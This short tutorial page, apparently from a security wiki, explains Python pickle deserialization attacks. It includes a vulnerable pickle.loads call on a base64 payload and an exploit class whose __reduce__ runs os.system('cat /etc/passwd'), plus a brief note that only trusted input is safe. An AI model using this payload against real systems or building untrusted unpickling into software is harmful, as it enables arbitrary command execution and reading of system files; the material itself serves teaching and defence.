# Pickle

## Exploitation

The example below is a vulnerable pickle code that can be exploited.

```text
import pickle

# Input can be base64 encoded of a file with it's content
user_input = "Y3Bvc2l4CnN5c3RlbQpwMAooUydjYXQgL2V0Yy9wYXNzd2QnCnAxCnRwMgpScDMKLg=="
pickle.loads(base64.b64decode(user_input))
```

If an attacker is able to create a python object with a shellcode in it's \_\_reduce\_\_ function, pickle will execute the shellcode.

This vulnerability is present in the pickle.loads\(\) function.

The following code is an exploit example to the pickle vulnerability. 

```text
import pickle

shellcode = 'cat /etc/passwd'

class Exploit(object):
    def __reduce__(self):
        return (os.system, (shellcode, ))


exploit = pickle.dumps(Exploit())
print(base64.b64encode(exploit).decode())

```

## Fix

Unfortunately there is no remediation to this issue other than only use trusted data inputs.



